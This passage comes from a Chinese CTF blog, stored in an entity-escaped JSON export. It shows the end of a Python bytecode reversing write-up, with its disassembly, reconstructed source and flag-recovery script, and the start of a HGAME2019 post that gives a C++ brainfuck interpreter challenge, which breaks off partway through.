PRINT_ITEM 88 PRINT_NEWLINE 89 LOAD_CONST 8 (&quot;Now let&apos;s start the origin of Python!\\n&quot;) 92 PRINT_ITEM 93 PRINT_NEWLINE 40 94 LOAD_CONST 9 (&apos;Plz Input Your Flag:\\n&apos;) 97 PRINT_ITEM 98 PRINT_NEWLINE 99 LOAD_NAME 6 (raw_input) 102 CALL_FUNCTION 0 105 STORE_NAME 7 (enc) 108 LOAD_NAME 1 (list) 111 LOAD_NAME 7 (enc) 114 CALL_FUNCTION 1 117 STORE_NAME 8 (lst) 120 LOAD_NAME 8 (lst) 123 LOAD_ATTR 9 (reverse) 126 CALL_FUNCTION 0 129 POP_TOP 130 LOAD_NAME 10 (len) 133 LOAD_NAME 8 (lst) 136 CALL_FUNCTION 1 139 STORE_NAME 11 (llen) 142 SETUP_LOOP 99 (to 244) 145 LOAD_NAME 12 (range) 148 LOAD_NAME 11 (llen) 151 CALL_FUNCTION 1 154 GET_ITER 155 FOR_ITER 85 (to 243) 158 STORE_NAME 13 (i) 161 LOAD_NAME 13 (i) 164 LOAD_CONST 10 (2) 167 BINARY_MODULO 168 LOAD_CONST 11 (0) 171 COMPARE_OP 2 (==) 174 POP_JUMP_IF_FALSE 196 177 LOAD_NAME 14 (chr) 180 LOAD_NAME 15 (ord) 183 LOAD_NAME 8 (lst) 186 LOAD_NAME 13 (i) 189 BINARY_SUBSCR 190 CALL_FUNCTION 1 193 LOAD_CONST 10 (2)46 &gt;&gt; 196 BINARY_SUBTRACT 197 CALL_FUNCTION 1 200 LOAD_NAME 8 (lst) 203 LOAD_NAME 13 (i) 206 STORE_SUBSCR 207 JUMP_FORWARD 0 (to 210) &gt;&gt; 210 LOAD_NAME 14 (chr) 213 LOAD_NAME 15 (ord) 216 LOAD_NAME 8 (lst) 219 LOAD_NAME 13 (i) 222 BINARY_SUBSCR 223 CALL_FUNCTION 1 226 LOAD_CONST 12 (1) 229 BINARY_ADD 48 230 CALL_FUNCTION 1 233 LOAD_NAME 8 (lst)49 236 LOAD_NAME 13 (i) 239 STORE_SUBSCR 240 JUMP_ABSOLUTE 141 &gt;&gt; 243 POP_BLOCK &gt;&gt; 244 LOAD_CONST 13 (&apos;&apos;) 247 STORE_NAME 16 (enc2) 250 LOAD_NAME 16 (enc2) 253 LOAD_ATTR 17 (join) 256 LOAD_NAME 8 (lst) 259 CALL_FUNCTION 1 262 STORE_NAME 16 (enc2) 265 LOAD_NAME 5 (encode) 268 LOAD_NAME 16 (enc2) 271 CALL_FUNCTION 1 274 STORE_NAME 18 (enc3) 277 LOAD_NAME 18 (enc3) 280 LOAD_NAME 4 (dec)55 &gt;&gt; 283 COMPARE_OP 2 (==) 286 POP_JUMP_IF_FALSE 283 289 LOAD_CONST 14 (&quot;You&apos;re right! &quot;) 292 PRINT_ITEM 293 PRINT_NEWLINE 294 JUMP_FORWARD 5 (to 302) 297 LOAD_CONST 15 (&quot;You&apos;re Wrong! &quot;) 300 PRINT_ITEM 301 PRINT_NEWLINE &gt;&gt; 302 LOAD_CONST 1 (None) 305 RETURN_VALUE 还是比较好看的，只是一开始把MAKE_FUNCTION 0当成了定义一个无参函数，造成了很多不必要的麻烦。后来通过自己写py然后编译pyc然后用dis看的方法，大致是还原出了py源码。 12345678910111213141516171819202122import stringletters=list(string.letters)+list(string.digits)+[&apos;+&apos;,&apos;/&apos;]dec=&quot;FcjTCgD1EffEm2rPC3bTyL5Wu2bKBI9KAZrwFgrUygHN&quot;def encode(str): &apos;换表base64&apos; return strenc=raw_input()lst=list(enc)lst.reverse()for i in range(len(lst)): if i % 2 == 0: lst[i]=chr(ord(lst[i])-1) continue lst[i]=chr(ord(lst[i])+1)enc2=&apos;&apos;enc2=enc2.join(lst)enc3=encode(enc2)if enc3==dec: print &quot;You&apos;re right! &quot;else: print &quot;You&apos;re Wrong! &quot;print letters 虽然定义的函数的内容dis模块是不会解析出来的，但是看见熟悉的string.letters+string.digits+&#39;+&#39;+&#39;/&#39;，我不经意间想起了base64，只是换了个表而已。dec字符串中的大小写互换，然后base64解密，之后通过逆运算得到flag。 逆运算脚本(换表base64就不自己手写了）： 123456789dec=&apos;|&quot;mpguxQ^3dispmb^pS`dn/dk4V|dn`hg&apos;lst=list(dec)for i in range(len(lst)): if i % 2 == 0: lst[i]=chr(ord(lst[i])+1) if i % 2 == 1: lst[i]=chr(ord(lst[i])-1)lst.reverse()print &apos;&apos;.join(lst)","categories":[],"tags":[]},{"title":"HGAME2019-brainfxxker's revenge","slug":"brainfxxker-s-revenge","date":"2019-02-05T08:36:27.000Z","updated":"2019-02-16T14:22:34.994Z","comments":true,"path":"2019/02/05/brainfxxker-s-revenge/","link":"","permalink":"http://yoursite.com/2019/02/05/brainfxxker-s-revenge/","excerpt":"题目来自于HGAME2019，之前一直放着没做，结果发现第一周的题目现在做已经没分了23333","text":"题目来自于HGAME2019，之前一直放着没做，结果发现第一周的题目现在做已经没分了23333 源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314#include &lt;iostream&gt;#include &lt;cctype&gt;#include &lt;string&gt;// the description of this challenge is totally useless 2333333// oyiadin, Jan 29, 2019// have fun XDnamespace bf &#123; class Parser &#123; public: Parser() = default; ~Parser() = default; void execute(const std::string &amp;buf); protected: uint8_t data[1000] = &#123;0&#125;; uint8_t *ptr = data;&#125;;void Parser::execute(const std::string &amp;buf) &#123; unsigned unmatched; for (auto i = buf.cbegin(); i != buf.cend(); ++i) &#123; switch (*i) &#123; case &apos;&gt;&apos;: ++ptr; break; case &apos;&lt;&apos;: --ptr; break; case &apos;+&apos;: ++*ptr; break; case &apos;-&apos;: --*ptr; break; case &apos;.&apos;: putchar(*ptr); break; case &apos;,&apos;: while ((*ptr = getchar()) == &apos;\\n&apos;) ; break; case &apos;[&apos;: if (*ptr == 0) &#123; unmatched = 1; while (unmatched) &#123; while (++i != buf.cend()) &#123; if (*i == &apos;[&apos;) &#123; ++unmatched; break; &#125; else if (*i == &apos;]&apos;) &#123; --unmatched; break; &#125; &#125; &#125; &#125; break; case &apos;]&apos;: if (*ptr != 0) &#123; unmatched = 1; while (unmatched) &#123; while (i-- != buf.cbegin()) &#123; if (*i == &apos;[&apos;) &#123; --unmatched; break; &#125; else if (*i == &apos;]&apos;) &#123; ++unmatched; break; &#125; &#125; &#125; &#125; break; default: putchar(*i); &#125; &#125;&#125;&#125;int main() &#123; bf::Parser parser; parser.execute( &quot;+-&gt;,&lt;&gt;-+&lt;&gt;&gt;+-+-+&gt;&lt;+-+&lt;&gt;+-&gt;&lt;+-+&lt;&gt;+-+&lt;&gt;&lt;&gt;+&gt;&lt;[&lt;&gt;&lt;--+&gt;&lt;&lt;&gt;-&lt;&gt;&gt;&lt;&lt;&gt;&gt;&lt;-&lt;&gt;&lt;&gt;+-&gt;&lt;-&lt;&gt;&gt;&lt;-+-+--+-&lt;&gt;&gt;&lt;-+&lt;&gt;&lt;&gt;-----&gt;&quot; &quot;&lt;&lt;&gt;&gt;&lt;+-&lt;&gt;--+--+&gt;&lt;+--+-&gt;&lt;-+-+-+-&gt;&lt;&lt;&gt;--+-+-+-&lt;&gt;-+--+-+-&lt;&gt;&lt;&gt;+-&lt;&gt;-+-&gt;&gt;&lt;-+-]&gt;&lt;&gt;&lt;-+&lt;&gt;+-&lt;-+---+&gt;&lt;-&lt;&gt;-+-&lt;&gt;[+&quot; &quot;-&lt;-+&gt;&lt;&gt;&lt;++--+-++-&gt;-+&lt;&gt;[+-+-&lt;&gt;--++-&gt;&lt;+-][.&gt;&gt;[&lt;-,[[+[-&lt;.[--+]-,+]&gt;&lt;.[&lt;,[[&lt;,--[,&gt;[,&lt;+,.,]&lt;&gt;]+]&lt;.-].[&gt;[-&quot; &quot;.,.,[&gt;&lt;&lt;[&lt;-[&gt;.&lt;,.+&lt;]-..].,.[&lt;&gt;+[+][.+-,.&gt;,-+]]-]-.]+&gt;,]]&gt;]&gt;,.&gt;][&lt;,[&lt;[&lt;-&gt;[-.-.-]-]&lt;&lt;[.+[[&gt;,-[&lt;.&lt;[&gt;-&lt;.&quot; &quot;+-&lt;]+&lt;]&lt;,[&lt;..+],&gt;+]+,]&lt;--]-.]+..[.&lt;-[,&lt;[&lt;&gt;.[,&lt;[,&gt;&lt;,.]&lt;&lt;+].[--[-..&gt;[-&lt;..]&lt;-]+.]+--]-&lt;&lt;&gt;,&lt;]&gt;&lt;&gt;&lt;-]-.&gt;]&lt;&quot; &quot;&gt;,]-&lt;]&gt;&lt;&gt;&lt;&gt;&lt;+-&gt;&lt;][.-.[,[,+&gt;,&gt;][++[+[.[&gt;[&lt;&lt;&gt;,].&lt;&gt;]-[&gt;,],,]+,[.--[+,-,-]+,+]-&lt;&lt;].-+]]]+-&lt;&gt;&lt;&gt;&gt;&lt;-+,&lt;&gt;+-&gt;&quot; &quot;&lt;&gt;&lt;-+&gt;+-+--++-+&gt;&lt;-+&lt;&gt;+-++--++-&gt;&lt;-++&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;+&gt;&lt;++-&lt;&gt;&gt;&lt;-+[&lt;&gt;&lt;-++--&gt;&lt;-+-+-&lt;&gt;&gt;&lt;+-&gt;&lt;-&gt;&lt;+---++---+-+-+&lt;&gt;-+&quot; &quot;-&lt;&gt;+--+&lt;&gt;+--+--&lt;&gt;-+&gt;&lt;--+-++--&gt;&lt;-+--+-&lt;&gt;-&gt;&lt;-&gt;&lt;&lt;&gt;-&gt;&lt;&lt;&gt;+-&gt;&lt;-&gt;&lt;&gt;&lt;-&gt;&lt;&lt;&gt;+-+--+-+--+&lt;&gt;-&gt;&lt;-+&gt;&lt;-+&gt;&lt;--+-++-&lt;&gt;&gt;&quot; &quot;-&lt;&gt;+--+]&lt;&gt;&gt;&lt;&lt;&gt;&lt;&lt;&gt;-++-&gt;&lt;-&lt;&gt;&lt;&gt;+-+-&lt;&gt;-&gt;&lt;&gt;&lt;-+--+&gt;&lt;&gt;&lt;+-&lt;&gt;[&gt;&lt;+--+&lt;+-+-+-+&gt;&lt;&gt;[&gt;&lt;-+--++-&lt;&gt;][.-+[&gt;&gt;+[&lt;&lt;,&lt;.&gt;[+&quot; &quot;&lt;&lt;&gt;.]+]-+&lt;[.&lt;.+[,[.&gt;&lt;,.+]+-..+]&gt;,-]-]&gt;--]&lt;&gt;]-++--++-,&gt;&lt;+-&gt;&lt;&gt;&gt;&lt;&gt;&lt;+&gt;&lt;-+-+-++&gt;&lt;&lt;&gt;&lt;&gt;+-+&lt;&gt;&lt;&gt;+-+&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;+&gt;&quot; &quot;&lt;&gt;&lt;-+[&gt;&lt;-+&lt;&gt;-+&lt;+---&gt;&lt;-+-+&lt;&gt;-+--+-+-+--+-+-&lt;&gt;-++-&gt;&lt;---+&lt;&gt;&lt;&gt;&gt;&lt;&gt;&lt;-&lt;&gt;+---+-+----+-&lt;&gt;&lt;&gt;-+-+--+-+-&lt;&gt;-&gt;&lt;-+&gt;&quot; &quot;&lt;&gt;&lt;-&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;--+&gt;&lt;--+-+&gt;+--&gt;&lt;&gt;&lt;&gt;&lt;+--+]+-+-&lt;&gt;&lt;-+&lt;&gt;+--+-&lt;&gt;-[&lt;&gt;&lt;&gt;&lt;-++-+&gt;&lt;&lt;&gt;&gt;&gt;&lt;-+&lt;&gt;&gt;&lt;&gt;&lt;[&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;-+-&gt;&lt;&gt;&lt;+-&quot; &quot;&lt;&gt;+-][,&gt;&gt;]+-&gt;&lt;-+-+&gt;&lt;],+-&gt;&lt;-++-&gt;-+&gt;&lt;+-++-+&gt;&lt;&lt;&gt;+++&gt;&lt;&gt;&lt;&gt;&lt;++-+[-+-+&gt;&lt;&lt;&gt;&lt;&lt;&gt;-&gt;&lt;&lt;&gt;-+-+-&gt;&lt;&lt;&gt;-++-&gt;&lt;-&lt;&gt;-+-+-+-&quot; &quot;+-&gt;&lt;-+--+-+-+-&lt;&gt;-+-&lt;&gt;+--+-&lt;&gt;&lt;&gt;+-+--+-+-+-&lt;&gt;--+&lt;&gt;--++-&lt;&gt;-+---+&lt;&gt;-&gt;&lt;&lt;&gt;-+-&gt;&gt;&lt;-&lt;&gt;][-[.&gt;[,,&lt;[.,.[,[&gt;[.,-+&quot; &quot;+].-][&lt;.[&gt;[,&lt;[&lt;&gt;+]&gt;[-+-[.&lt;&lt;+.-]-[&gt;]&gt;&lt;,]+][[+&gt;-+[&lt;,&lt;]]]++]++++]][-++[&lt;[&gt;+.,-]-,+]&lt;]].+]-,++].-,]+-&gt;&lt;-&quot; &quot;+&lt;&gt;+-&lt;-+-+&gt;&lt;-+-&lt;&gt;+---+-+&lt;&gt;-+-&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;&lt;&gt;-[&gt;&lt;&gt;&lt;+-&lt;&gt;&lt;+-+-+&gt;&lt;&gt;[-&lt;&gt;-+]-+],&gt;&lt;&lt;&gt;+-&gt;&lt;&gt;&lt;&gt;&lt;&gt;+&lt;&gt;-++-&lt;&gt;+-+&lt;&gt;++&lt;&gt;&quot; &quot;++-&lt;&gt;&gt;&lt;+&gt;&lt;&lt;&gt;+-+-&gt;&lt;++-&lt;&gt;+-+++-+-&lt;&gt;&gt;&lt;+-[&gt;&lt;&lt;&gt;+-&lt;&gt;&lt;--+-+-&gt;&lt;&lt;&gt;-+-+-&lt;&gt;+--&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;-&lt;&gt;&lt;&gt;-+-+--&lt;&gt;-+-&lt;&gt;-+--+-&lt;&quot; &quot;&gt;-&gt;&lt;&lt;&gt;&gt;+-&lt;&gt;+-+--+-&lt;&gt;&gt;&lt;][&gt;&lt;+-[&gt;[&gt;[+.[.[-&gt;&lt;[&gt;&lt;[,,++.[&lt;-[.+,&lt;]&lt;.&lt;]&gt;]]&gt;-,,].,]+&lt;]-,,&lt;][+.&gt;].],+]&lt;&gt;&lt;+-&gt;&lt;&lt;&quot; &quot;&gt;-&lt;&gt;&lt;&gt;--+&gt;&lt;[+-&lt;&lt;&gt;&gt;&lt;&lt;&gt;+-++-&gt;&lt;&gt;-+&lt;&gt;[+--+-]&lt;&gt;&lt;&gt;+-&lt;&gt;&gt;&lt;]-++-,&gt;-+-++-++-+-&gt;&lt;+&gt;&lt;+-+&gt;&lt;-+&gt;&lt;++--+&gt;&lt;&lt;&gt;+&lt;&gt;&gt;&lt;-++-&quot; &quot;&gt;&lt;+&gt;&lt;+&lt;&gt;-+&gt;&lt;-++-++--++-&gt;&lt;[-+&lt;-+-&gt;&lt;--+&gt;&lt;--+-+-++--&gt;&lt;-&gt;&lt;&lt;&gt;-&lt;&gt;&gt;&lt;&gt;&lt;-+--++--+-&lt;&gt;&gt;&lt;-&gt;&lt;&gt;&lt;-++--&lt;&gt;&gt;&lt;-+-++---&lt;&quot; &quot;&gt;+--+---+&gt;&lt;-+&lt;&gt;-&lt;&gt;&gt;-++--+-+-+-&gt;&lt;][..,,]&gt;&lt;&lt;&gt;-+-+&lt;&gt;&lt;+-+-&lt;&gt;+--&gt;&lt;&lt;&gt;--+-++-+--+--+&lt;&gt;&lt;&gt;+-[-+-+&gt;&lt;&gt;&lt;&lt;-+-+-++&quot; &quot;-++--++-&lt;&gt;&gt;[-]+-&gt;&lt;&gt;&lt;-+&lt;&gt;][&gt;]&gt;&lt;&gt;&lt;&gt;&lt;+--+,+-&gt;&lt;&lt;&gt;&gt;+-+-+-&gt;&lt;+&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;+-+-+&lt;&gt;&lt;&gt;-++&gt;&lt;+-++--++--+++&gt;&lt;&lt;&gt;++-+-&lt;&quot; &quot;&gt;-+++--+&lt;&gt;-++-[-+&lt;-+-&gt;&lt;&gt;&lt;-+-+--&gt;&lt;+-+--&gt;&lt;&lt;&gt;&gt;&lt;-+-&gt;&lt;--+&lt;&gt;-+&lt;&gt;-&lt;&gt;&lt;&gt;&gt;&lt;&gt;&lt;-+-&gt;&lt;-+--+-+-&gt;&lt;+---+&lt;&gt;-&gt;&lt;-+&gt;&lt;&gt;-++&quot; &quot;-+--+&lt;&gt;--++-+-+--+][-+&gt;&gt;-]&lt;--&lt;&gt;--&lt;&gt;&lt;&gt;--+&gt;&lt;[&gt;&lt;&gt;&lt;-+-+&lt;++-&lt;&gt;&lt;&gt;&gt;&lt;&gt;[-+-+&lt;&gt;+--+-&lt;&gt;+-&lt;&gt;-+][[[--.[-.-&gt;[&lt;,.,[&quot; &quot;++&gt;&lt;&lt;&gt;&gt;&lt;&gt;]]&lt;]-.[.,[.&lt;&gt;]&gt;[&lt;&lt;&gt;[[&gt;&gt;-]+-[&gt;-.[,+&lt;&lt;[[--,&lt;&gt;+,],&gt;[-&gt;-].,+]++&lt;]&lt;[-.[[+,&gt;&lt;+&lt;]&gt;[-&lt;.&gt;&lt;+]&gt;&gt;],[-,[&quot; &quot;&lt;]+&lt;]&lt;.]]--+].]]],++]-&gt;[.-[,[-.&lt;&lt;.,].-[,-[,++]+,]]&gt;-&lt;]--&gt;]+-&gt;&lt;&gt;&lt;],+-&gt;&lt;&gt;-++++-+-++--+-++-++-+&lt;&gt;&lt;&gt;+&lt;&gt;&gt;&quot; &quot;&lt;+--++-++&gt;&lt;+--+++-&gt;&lt;+--+&gt;&lt;[-+&lt;&gt;&gt;&lt;-+&lt;+--+&lt;&gt;&lt;&gt;&gt;&lt;-+-+-+--+&lt;&gt;--+--+-+--++-&gt;&lt;&gt;&lt;-&lt;&gt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;+--]+-&gt;&lt;+-&lt;--+&gt;&lt;&quot; &quot;&lt;&gt;&gt;&lt;&lt;&gt;-+--+-+-+-+---++---+-&gt;&lt;+-[+-&gt;&lt;&lt;&gt;&lt;+-&gt;&lt;+-+&lt;&gt;-+&lt;&gt;+-+-&gt;[&gt;&lt;-+-&gt;&lt;&gt;&lt;][[&lt;&lt;[,-.[&lt;+,-+&lt;]&gt;+],&lt;-,]+.++,.]&lt;&quot; &quot;&gt;&gt;&lt;&gt;&lt;&gt;&lt;]-+&gt;&lt;,&gt;&lt;&gt;&gt;&lt;&gt;&lt;+-+-+-+&gt;&lt;+-&lt;&gt;&gt;&lt;++--+&lt;&gt;+-+-+&lt;&gt;+-+-+&lt;&gt;+-+&gt;&lt;+&gt;&lt;&gt;&lt;&gt;&lt;&lt;&gt;[&lt;&gt;-+&lt;&gt;&lt;+-&lt;&gt;+---+&gt;&lt;--+--+-&gt;&lt;&gt;&lt;&quot; &quot;--+-&lt;&gt;-++--+-&lt;&gt;+-+--&lt;&gt;&gt;&gt;&lt;&lt;&gt;+--+&lt;&gt;-]&gt;&lt;&lt;&lt;&gt;&lt;&gt;&lt;&gt;+---&gt;&lt;+-&gt;&lt;&gt;&lt;-+-&gt;&lt;-+-&gt;&lt;-++-&lt;&gt;+--[+-&gt;&lt;+-&lt;&lt;&gt;+&gt;&lt;&gt;&lt;&gt;[-&lt;&gt;&gt;&lt;]]&gt;&quot; &quot;&lt;&gt;&lt;&lt;&gt;&lt;&gt;-+,&gt;&lt;-+&gt;+-&gt;&lt;+-+&lt;&gt;-+++-+-&lt;&gt;+-++-+&gt;&lt;&gt;&lt;+&gt;&lt;+[&lt;-&gt;&lt;&gt;&lt;-+---+&gt;&lt;&gt;&lt;-&lt;&gt;+-&gt;&lt;+-&lt;&gt;-+-&gt;&lt;-+-+--+&lt;&gt;&lt;&gt;-+--&lt;&gt;-++&quot; &quot;-+-&gt;&lt;-&lt;&gt;&lt;&gt;&gt;&lt;-+-&gt;&lt;&lt;&gt;--++-&gt;&lt;&lt;&gt;-&gt;&lt;+-+--&gt;&lt;--+&gt;&lt;+---+&gt;&lt;-+&gt;&lt;-&gt;&gt;&lt;+-+--+-+-]-+&gt;&lt;&lt;-+-++-&lt;&gt;&gt;&lt;-[&gt;&lt;+-&lt;+--++-&gt;&lt;++&quot; &quot;-+-&gt;&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;[&gt;&lt;+--+&lt;&gt;-+--+&gt;&lt;&lt;&gt;][,&lt;+,]]+-&lt;&gt;,+-&gt;&lt;+-+-&gt;-+-+&lt;&gt;&lt;&gt;&lt;&gt;++&lt;&gt;++-&lt;&gt;&gt;&lt;+--+++&lt;&gt;&gt;&lt;-++-+-++--++&lt;&gt;&gt;&lt;-&quot; &quot;+-+-+++-&gt;&lt;-++&gt;&lt;+-&gt;&lt;+-[&lt;--+&lt;&gt;-+-&gt;&lt;+--&lt;&gt;--+-+-+--+&lt;&gt;-&gt;&lt;+-&gt;&lt;-+-&gt;&lt;--+--++-&gt;&lt;&gt;&lt;-&lt;&gt;&lt;&gt;-+&gt;&lt;-&gt;+-&gt;&lt;&lt;&gt;&gt;&lt;-+--+&gt;&lt;&quot; &quot;][--+&gt;]&lt;&gt;+-&lt;&gt;&lt;&lt;&gt;&lt;&gt;-+-+-+-&lt;&gt;-&lt;&gt;-+-+[-+&gt;&lt;&gt;&lt;&gt;&lt;&lt;&lt;&gt;-+-+-+++-&lt;&gt;&lt;&gt;+-+-&gt;+-&gt;&lt;[&lt;&gt;+-+--+-&gt;&lt;+-&lt;&gt;]-+-+&gt;&lt;&gt;&lt;]+-,&gt;+-&quot; &quot;&gt;&lt;+&lt;&gt;+&gt;&lt;+-+&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;+-+&lt;&gt;&lt;&gt;+&lt;&gt;&lt;&gt;+&gt;&lt;+-&gt;&lt;-+[&lt;&gt;&lt;-++--++---+&lt;&gt;-&lt;&gt;-&gt;&lt;-++-&lt;&gt;--++-+-&gt;&lt;+---&lt;&gt;-+-+-&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;+&quot; &quot;--&gt;&lt;+-+-&gt;&lt;-+&gt;-+&gt;&lt;&lt;&gt;&lt;&gt;&lt;&gt;-+-+--+&gt;&lt;]&lt;-[&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;&lt;&gt;&lt;&lt;&gt;-+&gt;&lt;+-+&gt;[&gt;&lt;-&lt;&gt;&lt;&gt;+-][&lt;--+.[&lt;[[.,[...],],.]&gt;,&lt;-.]]]+-&quot; &quot;,+-&gt;+&gt;&lt;-+++&gt;&lt;+-+-&gt;&lt;+&lt;&gt;-+-+++-+&gt;&lt;+-+&gt;&lt;&lt;&gt;[-+&lt;&gt;&lt;&gt;&lt;&lt;&gt;-+&gt;&lt;&lt;&gt;--+&lt;&gt;&lt;&gt;+-----+&lt;&gt;&lt;&gt;-&lt;&gt;&gt;&lt;-+-&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;-&lt;&gt;&gt;-+-+-+-&quot; &quot;+-&gt;&lt;+--+-+]+-&lt;&lt;&gt;+-&gt;&lt;-&gt;&lt;-+-++-[-+&gt;&lt;&lt;-++--+++-+-+--+&gt;&gt;&lt;+-&gt;&lt;+-[&gt;&lt;+-&gt;&lt;+-&lt;&gt;--+&lt;&gt;&lt;&gt;+-]&gt;&lt;&lt;&gt;&gt;&lt;][&gt;,,-]-+&lt;&gt;&lt;&gt;&lt;&quot; &quot;&gt;,&lt;&gt;&gt;&lt;-+&lt;&gt;&gt;&lt;&gt;&lt;&gt;-+-+&gt;&lt;+&gt;&lt;+-++-++-+-&lt;&gt;&lt;&gt;&lt;&gt;+&lt;&gt;&gt;&lt;-+&lt;&gt;&lt;&gt;++-&lt;&gt;+-&gt;&lt;+&lt;&gt;-++[&gt;&lt;&lt;&gt;&lt;&lt;&gt;-&lt;&gt;&lt;&gt;-++-&gt;&lt;-&gt;&lt;-&lt;&gt;+----+--&lt;&quot; &quot;&gt;-+-++-&lt;&gt;&gt;&gt;&lt;-&lt;&gt;-++-&gt;&lt;&lt;&gt;][&gt;&gt;[-&gt;[,&lt;&lt;]],.[&lt;+.[,-.[,[+[-[&lt;&gt;&gt;,.[-+[&gt;.&gt;&lt;[.&lt;.,&lt;&gt;.]].-],]&gt;..&lt;&lt;]]&lt;.,]&lt;++&gt;]-+.&quot; &quot;+&gt;]]+-&lt;&gt;&lt;[+--+&gt;&lt;&lt;&gt;-+&lt;+-+&lt;&gt;&lt;&gt;-+&lt;&gt;&gt;-++-&gt;&lt;+--+[-+--++-][[.-[+[.&gt;&gt;[,-&gt;-]&gt;[[.-&lt;..&lt;[.,[.+[-+,[.&lt;,&gt;].,,[&lt;.&gt;&quot; &quot;+-&lt;.]-+&gt;]..]&lt;-+.++].]]&lt;]+],&gt;]-..+-]+-]&lt;&gt;,-++-+-&gt;&lt;+-&gt;&gt;&lt;&lt;&gt;+&gt;&lt;+-&lt;&gt;+-++-+-+&gt;&lt;+-+&gt;&lt;&lt;&gt;+&lt;&gt;[&gt;&lt;&lt;&gt;+-&lt;&gt;&lt;&gt;&lt;+-&gt;&lt;&lt;&quot; &quot;&gt;-&gt;&lt;-+-&lt;&gt;&lt;&gt;--+-+&gt;&lt;--&gt;&lt;-&gt;&lt;&lt;&gt;+-&gt;&lt;-&lt;&gt;--++-&lt;&gt;+-&lt;&gt;-&gt;&lt;&gt;&lt;&lt;&gt;-++---+&lt;&gt;-+-&gt;-+-+-&gt;&lt;&gt;&lt;+--+][[-.&gt;-[]&gt;+.]&gt;&lt;[[+[+[+&quot; &quot;&lt;[..&gt;[&lt;.[&gt;&gt;++,]&gt;---]++[-&lt;.[+&lt;&gt;&lt;[,[-,+-,]&gt;[&lt;,&gt;]&lt;&lt;&gt;]+-]]][-[,[-,+-[+&gt;[&gt;,+&lt;]&lt;&gt;.[.&lt;&gt;.-]]+]&lt;.]&gt;]..]]+.+[-&quot; &quot;[+&lt;,[[..-[,+.[&gt;[&lt;]+[&gt;].]+&lt;],.[[.[,-.].[+,&gt;,]--][,[+&lt;.].&lt;[+].&lt;],&gt;],&lt;,],&gt;&gt;]+[.&lt;&gt;..,]-+,]+&gt;,&gt;]-]--&lt;]&lt;++&quot; &quot;]&lt;+--+-+-&gt;&lt;[+-&gt;&lt;&gt;&lt;&gt;&lt;+-&lt;&lt;&gt;&gt;&lt;&gt;&lt;+-+-+&lt;&gt;+-&gt;&lt;&gt;[&lt;&gt;-+-+-+-][&gt;[,[-+&lt;[-[&gt;&gt;[,&gt;+[&lt;[&lt;&lt;&lt;&lt;&lt;.]-[&gt;-[&gt;-.[.-&lt;.&gt;]]..&lt;]]&quot; &quot;-&gt;&lt;]&gt;&gt;&lt;[&gt;-[,+[,,[+[.+]++-][.,.[+&gt;&lt;&lt;-]-]+]-&lt;.]&gt;-.&gt;]+-][-]]][[.,[.-&lt;[[&gt;+&lt;+&gt;&gt;&lt;]-[[.---[-&lt;+.&gt;&gt;]][.[&gt;[.&gt;&lt;&quot; &quot;]+[-,,],]&gt;+]]]-].+,&lt;],&gt;-.]&gt;&lt;,]-&lt;-[&lt;-[[[&gt;&lt;&gt;&gt;&gt;[,&gt;&gt;&gt;&lt;.[.&lt;-++[&gt;&gt;-+,[.&gt;&lt;[]++&gt;]++]]&lt;],][+.&gt;-+]]+,[-+&gt;[,&gt;+&gt;&quot; &quot;+[,,-[-&gt;+[&gt;&gt;[+.-+&gt;[++-,.&lt;&gt;]+].,]&lt;,]&lt;]-&gt;-]&lt;++]-&gt;.]-.-]-,]&gt;&lt;&gt;&lt;][&gt;.+]&lt;&gt;&lt;&gt;,-+&lt;&gt;+-&gt;&lt;&gt;+-++--++-++-+-++&lt;&gt;-+&quot; &quot;-+-++&lt;&gt;-++&gt;&lt;-+[&lt;-&lt;&gt;-+---+&gt;&lt;-++--+-&gt;&lt;&gt;&lt;--+&gt;&lt;--+-+&lt;&gt;-&lt;&gt;&gt;&lt;&lt;&gt;&lt;&gt;-+-&gt;&lt;-&gt;-+&lt;&gt;-]+-+-+-&lt;&gt;&gt;&lt;&lt;&gt;&lt;&gt;&lt;+-&lt;&gt;&lt;&gt;-&gt;&lt;&gt;&lt;-+&quot; &quot;&lt;&gt;&gt;&lt;--+-+&lt;&gt;-+-[-+&gt;&lt;-+-+&lt;&gt;&lt;&gt;&lt;&lt;&gt;+-+-+&gt;&lt;&lt;&gt;&lt;&gt;&gt;[+--+-&lt;&gt;&gt;&lt;-+&gt;&lt;&lt;&gt;]&lt;&gt;&lt;&gt;-+][&gt;,&lt;,&gt;.]+-,&gt;&lt;&gt;+-&gt;&lt;++-+-&gt;&lt;&lt;&gt;++-+&lt;&gt;&gt;&quot; &quot;&lt;+-++-++-+-++-[-++-&lt;-++--+-&lt;&gt;-+--+--+&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;--+-+&gt;&lt;&lt;&gt;-&lt;&gt;&lt;&gt;--+-&gt;&lt;-+&lt;&gt;+--&gt;&lt;&lt;&gt;+-&gt;&lt;--+-++--+&gt;&lt;--&lt;&gt;--+-+&quot; 